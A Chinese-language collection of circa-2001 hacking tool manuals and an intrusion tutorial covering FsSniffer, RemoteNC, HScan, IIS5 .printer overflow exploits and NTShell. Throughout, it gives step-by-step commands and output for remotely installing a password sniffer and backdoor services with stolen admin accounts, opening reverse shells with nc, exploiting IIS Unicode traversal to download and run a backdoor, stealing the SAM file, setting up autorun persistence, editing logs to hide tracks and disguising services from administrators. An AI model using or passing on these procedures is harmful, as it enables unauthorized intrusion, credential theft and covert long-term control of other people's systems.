流影 POP3/FTP Sniffer 说明

小榕软件实验室? 1995-2001

版权所有

www.netXeyes.com www.netXeyes.org

dansnow@21cn.com

光和影子


--------------------------------------------------------------------------------

FsSniffer只能在Windows 2000中使用，可以捕捉到本机和基于非交换环境局域网的POP3/FTP用户名和密码。

一、本地使用

FSSNIFFER -S <Bind IP> <Port> <Control Password>


Bind IP：指绑定的IP地址，通常就是本地主机IP地址。

Port：控制的端口，以后要通过这个端口登陆上去查看结果。

Control Password：登陆时的密码。

登陆上去后的命令

Show Result：查看捕获的记录

Quit：退出

ShutDown：结束Sniffer的运行

二、远程使用

例如：得到主机211.152.188.1的一个属于管理员组的帐号test:test，首先登录。

D:\>net use \\211.152.188.1\ipc$ test /user:test
The command completed successfully.

将fssniffer.exe复制到远程主机。(也可以用流光IV中提供的工具“种植者”来做这件事情)

D:\>copy "d:\My Documents\ShadowSniffer\Release\FsSniffer.exe" \\211.152.188.1\
dmin$
1 file(s) copied.

　

利用流光IV中的NTCMD启动FsSniffer.EXE，并将器安装成为服务


=============Windows NT/2000 NTCmd Ver 0.1 for Fluxay IV============
Written by Assassin, http://www.netXeyes.com http://www.netXeyes.org


NTCMD>ver

Microsoft Windows 2000 [Version 5.00.2195]

NTCMD>fssniffer.exe -I test test ShadowSniffer 211.152.188.1 7 123456 

Flux Shadow Sniffer(FTP/POP3) Edition, Written by Assassin 2001
TestSniffer1 installed. 

NTCMD> 


这样在远程主机上面安装了一个服务ShadowSniffer。

用net命令启动服务

NTCMD>net start shadowsniffer

The ShadowSniffer service is starting..
The ShadowSniffer service was started successfully.

安装成为服务的格式:

FsSniffer -I <Username> <Password> <Service Name> <Bind Local IP> <Port> <Control Password>

UserName:远程主机的用户名（必须具有超级用户权限)

Passwod:远程主机的密码

Service Name:安装的服务名称，如果安装失败，可以将FsSniffer.exe改名再试。

Bind Local IP:远程主机的IP。某些主机具有两个IP地址，这是就需要根据需要选择监听的IP地址(例如：局域网和外网)

Port:远程控制的端口

Control Password:远程控制的密码

过一段时间就可以登陆到FsSniffer开的端口7上面，查看结果了。

D:>telnet 211.152.188.1 7

Control Password: **************

===============Banyet Soft Labs. 1995-2001 All Rights Reserved.===============

=========Written by Assassin, Server Edition FluxShadow@21cn.com==============

====FluxShadow Remote FTP/POP3 Sniffer Beta 1, Pleased to See You Again!======

Flux Shadow Sniffer>show result

===========Flux Shadow Sniffer Edition Results===========

211.152.188.112(1106)->211.152.188.1(8213) USER zjf

211.152.188.112(1106)->211.152.188.1(8213) PASS 1qaz4rfv

211.152.188.1(8213)->211.152.188.112(1106) User zjf logged in.

211.152.188.1(8199)->211.152.188.112(1107) USER zjf

211.152.188.1(8199)->211.152.188.112(1107) PASS 1qaz4rfv

Total 10 Sniffered
======================================================

Flux Shadow Sniffer>quit

三、其他

FsSniffer -L 列出当前主机安装的服务。

FsSniffer -R <Service Name> 删除指定的服务。



【Remote NC】

Remote NC是在NT／2000中运行的一个工具，和NC类似，可以远程执行命令。和NC比较的优点在于：

1、远程安装启动，不依赖于Schedule服务。

2、可以以指定的用户身份运行，也可以以系统用户身份运行。

3、作为服务安装于远程系统，系统会自动启动。

4、快速。

近日提供下载。

D:\My Documents\RemoteSVC\Release>RemoteNC.exe

=======RemoteNC Beta 1, Written by Assassin 2001=======
http://www.netXeyes.com http://www.netXeyes.org

Usage: RemoteNC <IP> <Username> <Password> <Starting Mode>
                                <Service Name> <Description Name>
                                <Listen Port> <Control Password>
<IP>: Remote Host IP Address  远程主机IP地址
<Username>: Account name in Remote Host Who Must Has
Administrators Privilege  用户名(必须具有Administrators权限)
<Password>: Password of Account Name 密码
<Start Mode>: LocalSystem or RunAsUser  启动模式：LocalSystem(系统用户) RunAsUser(以前面指定的用户身份运行，推荐）
<Service Name>: Specify Service Name 服务的名称
<Description>: Description of Service, Displayed in Service Manager 服务的说明，显示在服务管理器中，如果同名服务已经存在，将会安装失败。
<Listen Port>: Service Listen Port 启动后监听的端口
<Control Password>: Control Password 控制密码


例子：
D:\My Documents\RemoteSVC\Release>RemoteNC 192.168.0.1 administrator password Runa
sUser "RemoteNC" "Provide Local CMD Redirect" 7 123456

=======RemoteNC Beta 1, Written by Assassin 2001=======
http://www.netXeyes.com http://www.netXeyes.org

[Install Service as RunasUser Mode]
Connecting 192.168.0.1 ..... Done.
Transffer File ..... Done.
Start Service ..... Done.


Now You can Tenlet 192.168.0.1 7 to Connect, Have a Joy :-) 安装成功
D:\My Documents\RemoteSVC\Release>
D:\My Documents\RemoteSVC\Release>telnet 192.168.0.1 7 登录到制定的端口
RemoteNC Control Password: **************
===============Banyet Soft Labs. 1995-2001 All Rights Reserved.===============
=========Written by Assassin, Server Edition FluxShadow@21cn.com==============


Microsoft Windows 2000 [Version 5.00.2195]
RemoteNC>net user
User accounts for \\VICTIM
-------------------------------------------------------------------------------
Administrator Guest IUSR_VICTIM

IWAM_VICTIM NetShowServices TsInternetUser zjf
The command completed successfully.

RemoteNC>net user test test /add
The command completed successfully.   

由于是以Administrators组的权限启动，所以不会出现1312错误。

如果是以系统权限启动，有时会出现1312错误，这就是推荐采用RunasUser安装的原因。

RemoteNC>


HScan V0.31使用说明

前段时间写了个PortScan,使用效果都说扫描速度很快,但就是功能太少了.
所以抽空继续写了写这个扫描器加了点功能.

1.内置扫描端口增加两个.达到32个.
2.端口扫描速度提高一倍.
3.增加CGI扫描功能,扫描800个CGI.扫描一台主机的速度在测试时拨号使用不超过3分钟.
4.CGI扫描增加了线程控制,一般情况下不用设置,除非你的网速低于30K.线程默认为200.
4.增加URL扫描,可以快速扫描一个网段有特定URL的主机.比如/scripts/root.exe .
5.增加FTP扫描,内置16个常用用户和20个常用密码.
6.增加ScanALL功能,将可以扫描目标的CGI,Port,FTP.不提倡使用ScanALL功能来进行网段扫描.
7.把扫描报告导出为html格式,查看结果更方便.
8.HScan的特点是速度快,体积小(仅仅18K),但缺点就是功能少.希望可以很快增加一些新功能.


使用方法:
D:\>HScan

=================== HUC Small Command Line Scanner V0.31 ==================
=============== By Lion, Welcome to http://www.cnhonker.net ===============

Usage: HScan <Option>

<Option>:
  -a  < HostName|IP|StartIP-EndIP >                            --Scan All
  -c  [ Port ] < HostName|IP|StartIP-EndIP > [ Thread ]        --CGI Scanner
  -f  [ UserName|anonymous ] < HostName|IP|StartIP-EndIP >     --FTP Scanner
  -p  [ Port|StartPort-EndPort ] < HostName|IP|StartIP-EndIP > --Port Scanner
  -u  < URL > < HostName|IP|StartIP-EndIP >                    --URL Scanner

Example:
  HScan -a  192.168.0.1
  HScan -c  80  192.168.0.1  100
  HScan -f  oracle 192.168.0.1-192.168.0.254
  HScan -p  21-80  192.168.0.1-192.168.0.254
  HScan -u  /index.htm  192.168.0.1-192.168.0.254

1. []里的为可选项,你可以不使用,<>里的为必选项,你必须填充它.

2. 选项 -a 为扫描目标的端口信息,CGI漏洞和FTP简单密码.
   < HostName|IP|StartIP-EndIP >  沿用HScan V0.2的网段扫描,你可以用域名,主机名,
      ip地址和一个ip段来代替它.任何选项可以使用 开始ip-结束ip 来定义要扫描的网段.
      比如扫描192.168.0.1到192.168.0.254网段的机器,可以表示为192.168.0.1-192.168.0.254
      不提倡进行所有项目的网段扫描.也就是使用 -a 选项. 

   扫描www.cnhonker.net的CGI,Port和FTP的使用方法为: 
      HScan -a www.cnhonker.net

3.. 选项 -c 为扫描目标的CGI漏洞.
   [ Port ]  为指定CGI扫描的端口,默认端口为 80.
   < HostName|IP|StartIP-EndIP > 同上.
   [ Thread ] 为指定cgi扫描的线程.默认线程为200.

   扫描www.cnhonker.net的httpd端口的CGI漏洞的使用方法为: 
     HScan -c www.cnhonker.net

3. 选项 -f 为扫描目标的ftp简单密码.
   [ UserName|anonymous ]  如果采用anonymous为进行匿名登陆的扫描,也可以使用真实的
       用户名来代替UserName,将扫描特定的用户.如果什么都不填将扫描内置的16个常见用户.
   < HostName|IP|StartIP-EndIP > 同上.

   扫描192.168.0.1到192.168.0.254网段的机器的默认FTP用户为:
     HScan -f 192.168.0.1-192.168.0.254
   扫描192.168.0.1到192.168.0.254网段能匿名登陆的机器为:
     HScan -f anonymous 192.168.0.1-192.168.0.254   

4. 选项 -p 为扫描目标的端口信息.
   [ Port|StartPort-EndPort ]  可以为一个端口或者为 开始端口-结束端口,如果什么都不填
       将扫描内置的32个常见端口.
   < HostName|IP|StartIP-EndIP > 同上.

   扫描192.168.0.1到192.168.0.254网段的机器的默认端口为:
     HScan -p 192.168.0.1-192.168.0.254 
   扫描192.168.0.1到192.168.0.254网段的机器的21到80端口为:
     HScan -p 21-80  192.168.0.1-192.168.0.254

5. 选项 -u 为扫描有特定URL地址的主机.
   < URL > 为你要扫描的URL地址,用真实的地址代替,比如/scripts/root.exe?/c+dir .
   < HostName|IP|StartIP-EndIP > 同上.
   
   扫描192.168.0.1到192.168.0.254网段有.ida扩展的机器为:
     HScan -u /null.ida 192.168.0.1-192.168.0.254

6.修补了CGI扫描模块扫描:HScan -p 80 x.x.x.x. 100 时的参数处理问题.
  这里感谢 魔岩蔷薇 发现并报告bug.:)


1.HScanV0.1为端口扫描器,采用多线程扫描,
  扫描结果保存为HScan.txt文件,
  大小为6.5k.

2002/01/03
V0.2
1.调整了线程和线程处理
  采用120个线程扫描端口,
  在我的机器上找端口的效果比SuperScan 3.0还好.
  比如:
  扫描一个C段254台主机的23端口,
  只要1分30秒左右.
  速度很快,
  在一般拨号上网的情况下使用,
  几乎没有误报现象.
2.修改了繁琐的参数设置
  最简单的扫描方式只要后面带一个主机就可以了.
  这将扫描内置的30个常用端口.
3.修改了结果显示界面
  扫描结果的显示界面也好看一些了.:)
4.内置30个常见端口
  21,22,23,25,53,79,80,110,111,113,123,135,
  139,143,443,512,513,514,515,540,1080,1433,
  1524,3306,3389,5631,6000,8000,8080,12345
5.大小为6.5k.

2002/1/22
V0.3

1.增加CGI漏洞扫描功能.
2.增加FTP简单帐号检测功能.
3.修改了端口扫描处理,速度提高一倍.扫一个C段的23端口大概为40秒.比fscan还快.

2002/1/23
V0.31

1.添加一句语句,修补了CGI扫描模块扫描:HScan -p 80 x.x.x.x. 100 时的参数处理问题.
  这里感谢魔岩蔷薇发现并报告bug.:)
2.添加18个CGI漏洞.
 

2002/1/29
1.添加17个CGI漏洞.

                IIS5 .Printer Exploit 使用说明

                   本程序适用于英文版IIS 5.0

1、首先在本机用NC开一个监听333端口。

C:\>nc -l -p 333

2、运行IIS5Exploit

D:\>jill xxx.xxx.xxx.xxx 211.152.188.1 333

===========IIS5 English Version .Printer Exploit.===========
===Written by Assassin 1995-2001. http://www.netXeyes.com===

Connecting 211.152.188.1 ...OK.
Send Shell Code ...OK
IIS5 Shell Code Send OK

其中211.152.188.1指向本地IP。

稍等片刻，如果成功则在本机NC监听的端口出现：

C:\>nc -l -p 333
Microsoft Windows 2000[Version 5.00.2195]
(C) Copyright 1985-1999 Microsoft Corp.

C:\>

这时候你是管理员的权限所以可以执行任何命令。如：

C:\>net user hack password /add

The command completed successfully.

C:\>net localgroup administrartors hack /add

这样就创建了一个属于Administrator组的用户Hack,密码为password.







     iisx v0.3 -- IIS5 中文版 .printer 远程溢出攻击程序

                    by isno

使用方法: iisx <目标主机> <sp> <-p|-a|-r attackhost attackport>
         
          sp: 0 --- 目标没有安装SP , 1 --- 目标安装了SP1

提供三种对IIS5 .printer漏洞的攻击方式：
       
-p --- 对攻击目标运行iisx 66.77.88.99 0 -p
       在66.77.88.99上开一个端口7788,可以直接telnet 66.77.88.99 7788

-a --- 对攻击目标运行iisx 66.77.88.99 0 -a
       在66.77.88.99上添加一个管理员帐号：hax，其密码也为hax,
       可以使用net use \\66.77.88.99\ipc$ "hax" /user:"hax"建立连接。

-r --- 反向连接（类似于jill的方式），具体实施方法如下：

       例如先在一台机器111.222.333.444上运行nc -vv -l -p 5432,
       然后对攻击目标运行iisx 66.77.88.99 0 -r 111.222.33.444 5432,
       这时在111.222.333.444就会出现来自66.77.88.99的连接。




        针对IIS5的.printer溢出程序，
直接在目标机器上开一个99端口的shell, 

溢出成功后IIS会停止响应
在shell中敲exit可以使IIS自动重起
如果不敲exit直接断开telnet, 那么以后仍然可以再次连接99端口继续使用原来的shell

注意：不要保留shell太长时间，用完就记得exit退出他，
　　　因为由于win2k本身的机制，会发现IIS停止响应了，
　　　保留shell太长时间会导致shell和iis全都死掉 !



谈谈怎样作后门、建跳板（兼谈Ntshell使用说明！） 


前段时间做了一些肉鸡做跳板，辛辛苦苦上传了很多文件，但使用不到几天就被K了，漏洞也补上了，后来干脆不用跳板了！结果警告来了！痛定思痛！如何在肉鸡上留下后门达到长期使用的目的呢？今天早上在网上找了一早，也没有找出什么有用的东西！还是自己动手吧！我门通常使用nc，ncx，netcat等东西来开后门，但这些后门只是临时的，，主要用于得到Admin权限，能不能留下长期的后门呢？能！ 
我在这里介绍的只是如何制作后门，不打算介绍如何得到Admin权限！至于如何得到Admin，方法很多！U，SQL，溢出、ipc管道、暴力…………单有一点是肯定的，要留后门，必须有Admin权限。 
我打算介绍用两种方法，确切的说是用两个软件！ 
第一：用小榕的remotenc。第二，用NT Shell 1.0 Beta，这两个软件的共同点是都能作为服务运行在远端服务器上！我使用下来感觉差不多！不过ntshell的功能远不止开后门，呵呵！很强大的工具！可以得到asp文件！这对想破江湖的人可是………… 
再强调一点，one：太容易进入的主机不要作自己的跳板（除非你进去后留下后门把漏洞给补上）two：速度太慢和小型http服务器不要作自己的跳板。three：进入得到Admin权限后接下来要作的事：留后门－－》做代理（就是snake的那个）－－》补漏洞 
以上三点属个人意见，供参考！ 
好了，说了半天的废话，我们开始用小榕的remotenc做我们的第一个跳板！ 
假设我们已经得到192.168.0.1的admin权限，user：hack password：123，并且192.168.0.1支持ipc$远程连接！（呵呵！废话！不能连接怎么作跳板！）在自己c:\hack下有remotenc，好，开始 
c:\hack\remotenc 192.168.0.1 hack 123 runasuser "RemoteNC" "Provide Local CMD Redirect" 7 91888 
解释： 
remotenc 目标主机 用户名 密码 启动模式 "服务名称" "服务说明" 监听的端口 
控制密码 /overwrite（注：可以不加该参数） 
其中： 
用户名必须是admin权限 
启动模式有runasuser和localsystem两种（建议用runasuser模式，如果runasuser模式失败就用localsystem模式） 
服务说明是启动后显示在服务管理器中的说明，为了迷惑管理员，建议不要用“hack”之类 
监听的端口是remotenc作为服务启动以后开的监听端口，可以是7、8等，但不要是21、23、25、80等 
控制密码：你telnet（或者ntshell）到监听端口后需要的密码，也就是你对remotenc的控制密码。（这里就不要要了哈！别这么小气三） 
/overwrite覆盖已经安装的remotenc（不要覆盖我的哈） 

回车后出现如下信息： 
=======RemoteNC Beta 4, Written by Assassin 2001======= 
http://www.netXeyes.comhttp://www.netXeyes.org 

[Install Service as RunasUser Mode] 
Connecting 192.160.0.1 ..... Done. 
Transffer File ..... Done. 
Start Service ..... Done. 

Now You can Telnet 192.168.0.1 to Connect, Have a Joy :-) 

也可能出现： 
=======RemoteNC Beta 4, Written by Assassin 2001======= 
http://www.netXeyes.comhttp://www.netXeyes.org 

[Install Service as RunasUser Mode] 
Connecting 192.168.0.1 ..... Done. 
Transffer File ..... Done. 
Start Service ..... Service Exsited,1206Failed. 
这是启动服务失败 
这是可以把安装模式换为localsystem，即 
c:\hack\remotenc 192.168.0.1 hack 123 localsystem "RemoteNC" "Provide Local CMD Redirect" 7 91888 
就能安装成功！ 
如果出现第一中情况，祝贺你，然后 
Microsoft Telnet> open 192.168.0.1 7 
正在连接到192.168.0.1 7... 
然后出现： 
RemoteNC Control Password:（这里输入你的控制密码91888） 
然后出现： 
RemoteNC Control Password: ********* 

===============Banyet Soft Labs. 1995-2001 All RightsReserved.=============== 

=========Written by Assassin, Server EditionFluxShadow@21cn.com============== 


Microsoft Windows 2000 [━ 5.00.2195] 

RemoteNC> 
哈哈，可以添加用户了！net命令就不用说了哈（即使hack 123的账户被K了，仍然可以telnet到7在remotenc下添加用户，只要他不发现在服务管理器中的Provide Local CMD Redirect，你就一直都有自己的账户！）拷贝必要的文件上去！twwwscan等（注意隐蔽），或者fshttp，fspop也加上去，哈哈真的很爽！也可作成自己的sock5代理。 
添加完用户，启动他的telnet服务如果没有启动的话），又可以继续运行你的twwwacan等东西了！ 


第二种方法，利用NT Shell 1.0 Beta 
为了讲述ntshell的详细用法，我详细讲述 
一、ntshell分为客户端和服务端！服务端的名称为ntshell.exe，客户端ntshellc.exe 
二、ntshell的语法： 
内建的命令都是以'?'开头，在命令行上输入'?help'可以查看命令帮助列表，命令不分大小写。共有以下几个命令，其中由于标准的telnet不支持文件传输，因此前两个命令就是文件互传，必须使用附带的客户端才能实现。同时虽然在文件传输时，你可以运行其他命令，但是同一时刻只能有一个文件在传输（也就是前一个get，put，httpget命令没完成，就不能再执行这3个命令中的任意一个），这主要是因为我为了编程方便，而且我觉得也没必要多个文件同时传输，不过如果有必要，以后可以考虑。 

?autorun [name file "args"] --- 将本程序添加到自动运行，将检查所有已知位 
置（先是注册表）；name是一个项名，file是程序名（当然也可以是其他 
程序），args是程序的参数列表，一定要用""括起来。缺省是NTKernel 
ntshell.exe "-w 10"。 
?canceldata --- 终止刚才传输的文件 
?chdir <dir> --- 更改服务器的当前目录，不加参数查看当前目录，可以是网上邻居中的共享 
?get <file> [port] --- 从服务器下载文件，可以指定使用服务器使用[port]端口传输 
?help --- 查看命令帮助列表 
?httpget <host> <url> --- 从 'host'主机上下载文件 'url', 必须以根'/'开始 
例如httpgethttp://192.168.0.1 / hackdir/hackprog.exe，可以没有http:// 

?pskill PID --- 杀死指定PID的进程 

?pslist --- 列出当前系统中的所有进程，如果是guests组可能很多进程不能获得详细信息 
?put <file> [port] --- 上传文件到服务器，可以指定使用服务器使用[port]端口传输 
?quit --- 服务器端退出，相当于使用exit命令，不过如果执行 
了copy con abc这样的坏内部命令，你就不能在使用exit命令 
了，可以使用quit退出 

?restart [<user> [pass]]--- 以user身份重启动shell，不过本版本只能重起 
shell，不能以指定的用户运行。原因是使用CreateProcessAsUser创建进 
程时权限不足，即使原来是admin也不行 
?sysinfor --- 获得系统的信息，现在只有os的简短信息 

　 

程序支持的参数为（使用'?use'参数可以查看该列表，不使用‘/?’或‘-?’来实现是因为一旦把它留在服务器上，敌方运行该程序查看到程序功能的话，就糟了） 

ntshell [-listen Listenport] [-time Timeout] [-pass Password] [-show] [-wait WInterval] [-until time] [-last LInterval] 

-listen Listenport --- 指定监听的端口，缺省值是22 
-time Timeout --- 指定超时的秒数，缺省值是180 
-pass Password --- 指定连接的口令，如果含有空格，使用" "包含口 
令； 缺省值是"let me in" 

-show ---显示一个console窗口，用户可以通过关闭该窗口结束本程序 
-wait WInterval ---在程序运行后，先等待WInterval分钟，然后监听端口 
-until hour：minu --- 在程序运行后，直到hour：minu时才监听端口 
-last LInterval --- 在程序监听端口后，如果LInterval分钟内没有连接，将 
结束程序 

最后三项是为了增加程序的隐蔽性，以避免在通常情况下使用程序发现监听的进程 

三、ntshellc的用法： 
在没有连接的情况下，提示符是NTShellc>，此时可以使用以下的3个内建命令，命令均为小写。命令可以简写。 

h[elp] ---- 显示支持的命令列表 
o[pen] <target> [port] ---- 与target的port进行连接，port缺省值是22 
q[uit] ---- 退出本程序 



程序支持的两个参数，可以使用标准的'/?'参数查看该列表。如果不提供参数将进入NTShellc>提示符，然后可以使用open命令进行连接。 

ntshellc [Target] [Port] 

[Target] ---- 要连接的服务器 
[Port] ---- 要连接的端口 

四、实例 

--NTShell使用示例 


本示例仅为示范NTShell的功能与语法，因此使用unicode漏洞进行攻击试验。其中以'//'开头的行是我的注释，其他的是程序的输出。 


//在本机运行客户端， 
F:\hacktool\ntshell>ntshellc 
NtShell Client Program. 
> Type Help to see the commands 

//连接目标计算机的www服务 
NTShellc>o 192.168.0.1 80 
> Connect to 192.168.0.1 at Port 80 ... 
> Connected with the server. 

//请求一个已知的文件 
GET /iissamples/default%c1%1csamples.asp /HTTP/1.0 

//找不到文件，IIS4.0，应该是%1%9c， 
HTTP/1.1 404 找不到对象 
Server: Microsoft-IIS/4.0 
Date: Sat, 10 Feb 2001 15:08:26 GMT 

//再来， 
NTShellc>o 192.168.0.1 80 
> Connect to 192.168.0.1 at Port 80 ... 
> Connected with the server. 

GET /iissamples/default%c1%9csamples.asp HTTP/1.0 
//行了，找到了， 
HTTP/1.1 200 OK 

//下面要试试，哪些web目录在和系统在同一个逻辑盘上 
GET /scripts/..%c1%9c../..%c1%9c../winnt/system32/cmd.exe?/c+dir 
//找到了，就用它了 
HTTP/1.1 200 OK 
Server: Microsoft-IIS/4.0 

Directory of C:\Inetpub\scripts 

01-01-09 02:58p <DIR> . 
01-01-09 02:58p <DIR> .. 
00-08-28 05:30p <DIR> proxy 
00-08-28 05:30p <DIR> tools 
4 File(s) 241,424 bytes 
850,364,416 bytes free 

> Connection closed 

NTShellc>o 192.168.0.1 80 

//拷贝cmd.exe 
GET /scripts/..%c1%9c../..%c1%9c../winnt/system32/cmd.exe?/c+copy+\winnt\system3 
2\cmd.exe+dmc.exe 

//不理它， 1 file(s) copied. 没有访问拒绝就行 
HTTP/1.1 502 网关错误 
Server: Microsoft-IIS/4.0 
Date: Wed, 07 Feb 2001 09:47:20 GMT 
Content-Length: 190 
Content-Type: text/html 

<head><title>CGI 运用程序中出错</title></head> 
<body><h1>CGI 错误</h1>指定的 CGI 应用程序因为没有返回完整的 HTTP 标题而运行不正 
常。它返回的标题是:<p><p><pre> 1 file(s) copied. 
</pre> 
> Connection closed 


//下面就方便了，赶紧把ntshell上传， 就使用ftp脚本吧， 

GET /scripts/dmc.exe?/c+echo+open+192.168.0.45>ftp.bin 
GET /scripts/dmc.exe?/c+dir 
GET /scripts/dmc.exe?/c+echo+anonymous>>ftp.bin 
GET /scripts/dmc.exe?/c+echo+test@test>>ftp.bin 
GET /scripts/dmc.exe?/c+echo+binary>>ftp.bin--//一定要有这步，不然有的运行不正常 
GET /scripts/dmc.exe?/c+echo+get+ntshell.exe>>ftp.bin 
GET /scripts/dmc.exe?/c+echo+quit>>ftp.bin 

//看看文件内容写的对不对， 
GET /scripts/dmc.exe?/c+type+ftp.bin 
HTTP/1.1 502 网关错误 
Server: Microsoft-IIS/4.0 
Date: Wed, 07 Feb 2001 14:57:14 GMT 
Content-Length: 232 
Content-Type: text/html 

<head><title>CGI 运用程序中出错</title></head> 
<body><h1>CGI 错误</h1>指定的 CGI 应用程序因为没有返回完整的 HTTP 标题而运行不正 
常。它返回的标题是:<p><p><pre>open 192.168.0.45 
anonymous 
test@test 
get ntshell.exe 
quit 
</pre> 
> Connection closed 


//好的，执行ftp 
GET /scripts/dmc.exe?/c+ftp+-s:ftp.bin 
GET /scripts/dmc.exe?/c+dir 

Directory of C:\Inetpub\scripts 

01-02-07 10:58p <DIR> . 
01-02-07 10:58p <DIR> .. 
98-11-11 04:04a 241,424 dmc.exe 
01-02-08 12:24a 64 ftp.bin 
01-02-08 12:25a 53,248 ntshell.exe 
00-08-28 05:30p <DIR> proxy 
00-08-28 05:30p <DIR> tools 
7 File(s) 294,736 bytes 
854,074,368 bytes free 

//执行ntshell， 
GET /scripts/ntshell.exe HTTP/1.0 

//ctrl+c结束这个连接，退出程序。 
//再次进入 
F:\hacktool\ntshell>ntshellc 
NTShellc>o 192.168.0.1 
> Connect to 192.168.0.1 at Port 22 ... 
> Connected with the server. 
let me in 

Use 'net helpmsg xxx' to see detail message of Error Code. 

Microsoft(R) Windows NT(TM) 
(C) Copyright 1985-1996 Microsoft Corp. 
//看看它的系统， 
C:\Inetpub\scripts>?sysinfor 
# Operation System is Windows NT 4.0, 
# Build Number:1381 
# Service Pack 4 
//nt4+sp4的，去看看log文件 
C:\Inetpub\scripts>cd c:\winnt\system32\logfiles 
C:\WINNT\system32\LogFiles>cd w3svc1 
cd w3svc1 
拒绝访问。 

//得，还没的看，以后再说吧； 

C:\WINNT\system32>cd ..\repair 
C:\WINNT\repair>dir 
00-03-31 09:15p 3,544 sam._ 

//虽然有用的可能性很小，不过还是那回来试试吧， 
C:\WINNT\system32>?get \winnt\repair\sam._ 
> download file 'sam._' 3544 bytes complete success. 

//看看它都运行了什么程序， 
C:\WINNT\system32>?pslist 
# EnableDebugPrivileges Error, Code:1300 
Process ID: 2 Query Process Detail infor Error 
Process ID: 25 Query Process Detail infor Error 
Process ID: 33 Query Process Detail infor Error 
... 
Process ID: 565 Query Process Detail infor Error 
Process ID: 572 C:\Inetpub\scripts\ntshell.exe 
Process ID: 466 C:\WINNT\System32\cmd.exe 

# Total 42 processes in system. 

//喔赛，都看不了，还有个1300是什么错误？用net看看 
C:\WINNT\system32>net helpmsg 1300 
net helpmsg 1300 
并非所有被引用的特权都分配给调用者。 

//看来guest的权限实在太小了，好在知道ntshell和它的cmd进程id，不行了可以杀 


C:\Inetpub\scripts>?help 
#?autorun [name file "args"] --- add the [file] to autorun when reboot, 
[file] default is ntshell.exe 

//可以自动运行，要试试, 
C:\Inetpub\scripts>time 
time 
当前时间: 5:33:27.32 
输入新时间: 

//它的时间和我的差不多，行了 

C:\Inetpub\scripts>?autorun ntshelld ntshell.exe "-until 2:00 -pass "a b c" -last 60" 
# file 'C:\Inetpub\scripts\ntshell.exe' has added to autorun at 
C:\WINNT\Profiles\All Users\「开始」菜单\程序\启动\ntshelld.lnk 

//看来没在注册表中找到位置，到底在开始菜单中找到一个可以运行的地方，好了，等着系统重起动吧 
//（一定注意参数作为一个字符串，使用" "括起来，不然可能就不对了。这个参数的意思是“程序//运行后，直到夜里2点开始监听连接，持续60分钟，连接后使用a b c作为口令”） 

C:\Inetpub\scripts>del ftp.bin 
C:\Inetpub\scripts>exit 

NTShellc>q 


//破解完了sam._，用里边的密码进行，net use无效，看来这个密码文件没什么用了， 
//过两天在夜里2点到3点之间进行连接，看看成功否 

NTShellc>o 192.168.0.1 
> Connect to 192.168.0.1 at Port 22 ... 
> Connected with the server. 
//连上了，ok 
a b c 

C:\>cd winnt\system32\logfiles 
C:\WINNT\system32\LogFiles>cd w3svc1 
C:\WINNT\system32\LogFiles\W3SVC1>?get C:\WINNT\system32\LogFiles\W3SVC1\ex010205.log 
//把记录改改，再给他put回去 
C:\WINNT\system32\LogFiles\W3SVC1>?put ex010205.log 

//好了，这台机器行了，在加个admin组的用户， 
//把ntshell的客户端拿过来，再看看其他机器， 

C:\WINNT\system32\LogFiles\W3SVC1>cd \inetpub\scripts 
C:\Inetpub\scripts>?put ntshellc.exe 

//运行它， 
C:\Inetpub\scripts>ntshellc 
NTShellc>o 192.168.0.45 80 
> Connect to 192.168.0.45 at Port 80 ... 
> Connected with the server. 

GET / HTTP/1.0 


HTTP/1.1 200 OK 
Server: Microsoft-IIS/5.0 
Content-Location:http://192.168.0.45/index.html 

//嗯，是台win2k+iis5, 如发炮制。 

NTShellc>NTShellc>q 

C:\Inetpub\scripts> 



//想办法上传ntshell，并运行它，然后运行ntshellc进行连接 
C:\Inetpub\scripts>ntshellc 
NTShellc>NTShellc>o 192.168.0.45 
> Connect to 192.168.0.45 at Port 22 ... 
> Connected with the server. 

D:\Inetpub\Scripts>cd \ 
cd \ 
//取看看log文件，是我连接的，还是192.168.0.1 
D:\>cd winnt\system32\logfiles 

cd winnt\system32\logfiles 

D:\WINNT\system32\LogFiles> 

D:\WINNT\system32\LogFiles>cd w3svc1 

D:\WINNT\system32\LogFiles>cd w3svc1 

D:\WINNT\system32\LogFiles\W3SVC1>D:\WINNT\system32\LogFiles\W3SVC1>type ex010208.log 

D:\WINNT\system32\LogFiles\W3SVC1>type ex010208.log 
#Software: Microsoft Internet Information Services 5.0 
#Version: 1.0 
#Date: 2001-02-08 02:04:40 
#Fields: time c-ip cs-method cs-uri-stem sc-status 
10:11:34 192.168.0.1 GET /index.html 200 

D:\WINNT\system32\LogFiles\W3SVC1>time 
time 
当前时间: 10:18:42.97 
输入新时间: 

D:\WINNT\system32\LogFiles\W3SVC1>exit 

exit 

> Connection closed 
NTShellc>NTShellc> 



//ok, telnet跳板基本还可以，就是有时输出重复，一般一个命令得回车两次 



